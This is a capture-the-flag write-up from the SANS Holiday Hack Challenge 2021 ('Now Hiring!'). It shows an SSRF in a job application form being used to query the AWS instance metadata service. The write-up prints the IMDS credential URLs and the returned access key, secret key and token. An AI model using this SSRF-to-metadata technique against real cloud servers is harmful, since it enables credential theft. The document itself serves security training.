# Writeup for SANS Holiday Hack Challenge 2021 – Jack’s Back! featuring KringleCon 4: Calling Birds
## 10. Now Hiring!
### 10.0. Description
Difficulty: :christmas_tree::christmas_tree::christmas_tree:  
What is the secret access key for the [Jack Frost Tower job applications server](imgs/https://apply.jackfrosttower.com/)? Brave the perils of Jack's bathroom to get hints from Noxious O. D'or.

### 10.1. [Side Challenge - IMDS Exploration](imgs//10.%20Now%20Hiring!/10.01%20IMDS%20Exploration/README.md)

### 10.2. Hints
**AWS IMDS Documentation** - *Noxious O. D'or*: “The AWS documentation for IMDS is interesting reading.”

#### 10.3. Solution
The application form allows the insertion of an URL under the name of “URL to your public NLBI report”:  
![Apply](imgs/00_Apply.png)

I gave the URL of a computer I own and observed the application was fetching the URL specified without much control:
```bash
root@debian:~/hiring# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 …
34.132.188.111 - - [06/Jan/2022 08:44:41] "GET / HTTP/1.0" 200 -
34.132.188.111 - - [06/Jan/2022 08:44:56] code 404, message File not found
34.132.188.111 - - [06/Jan/2022 08:44:56] "GET /non-existent HTTP/1.0" 404 -
34.132.188.111 - - [06/Jan/2022 08:46:56] "GET /test_test_test HTTP/1.0" 200 -
```

When the file does not exist (`non-existent`), the application is just accepted:  
![01_non-existent.png](imgs/01_non-existent.png)

In case the file exist (`test_test_test`), the application shows more data:
![02_existent.png](imgs/02_existent.png)

Inspecting the broken image link, it is possible to recognize it is returning the content of the test page:
```bash
root@debian:~/hiring# curl "https://apply.jackfrosttower.com/images/asd.jpg"
Hi, I'm a test file!
```

At that point it was pretty straightforward to go ahead and test with AWS URLs considering the side challenge.
Submitting the URL http://169.254.169.254/latest/meta-data/iam/security-credentials I retrieved the `jf-deploy-role` user.
Submitting the URL http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role:
```json
{
  "Code": "Success",
  "LastUpdated": "2021-05-02T18:50:40Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "AKIA5HMBSK1SYXYTOXX6",
  "SecretAccessKey": "CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX",
  "Token": "NR9Sz/7fzxwIgv7URgHRAckJK0JKbXoNBcy032XeVPqP8/tWiR/KVSdK8FTPfZWbxQ==",
  "Expiration": "2026-05-02T18:50:40Z"
}
```

As the challenge required the `SecretAccessKey`, it is `CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX`.

#### 10.4. Thank you for the proxy
![meme](imgs/03_meme.png)

---
## [2. Where in the World is Caramel Santiaigo?](imgs/README.md)
## [2.1. Side Challenge - Exif Metadata](imgs/README.md)
## [3. Thaw Frost Tower's Entrance](imgs/README.md)
## [3.1. Side Challenge - Grepping for Gold](imgs/README.md)
## [4. Slot Machine Investigation](imgs/README.md)
## [4.1. Side Challenge - Logic Munchers](imgs/README.md)
## [5. Strange USB Device](imgs/README.md)
## [5.1. Side Challenge - IPv6 Sandbox](imgs/README.md)
## [6. Shellcode Primer](imgs/README.md)
## [6.1. Side Challenge - Holiday Hero](imgs/README.md)
## [7. Printer Exploitation](imgs/README.md)
## [7.0. Description](imgs/README.md)
## [8. Kerberoasting on an Open Fire](imgs/README.md)
## [8.1. Side Challenge - HoHo … No](imgs/README.md)
## [9. Splunk!](imgs/README.md)
## [9.1. Side Challenge - Yara Analysis](imgs/README.md)
## [10. Now Hiring!](imgs/README.md)
## [10.1. Side Challenge - IMDS Exploration](imgs/README.md)
## [11. Customer Complaint Analysis](imgs/README.md)
## [11.1. Side Challenge - Strace Ltrace Retrace](imgs/README.md)
## [12. Frost Tower Website Checkup](imgs/README.md)
## [12.1. Side Challenge - The Elf C0de Python Edition](imgs/README.md)
## [13. FPGA Programming](imgs/README.md)
## [13.1. Side Challenge - Frostavator](imgs/README.md)
## [14. Bonus! Blue Log4Jack](imgs/README.md)
## [15. Bonus! Red Log4Jack](imgs/README.md)
---
## [0. windovo\\thedead> whoami](imgs/../README.md)
## [1. KringleCon Orientation](imgs/01.%20KringleCon%20Orientation/README.md)
## [16. That’s how Jack came from space](imgs/../README.md#16-thats-how-jack-came-from-space)
## [17. Narrative](imgs/../README.md#17-narrative)
## [18. Conclusions](imgs/../README.md#18-conclusions)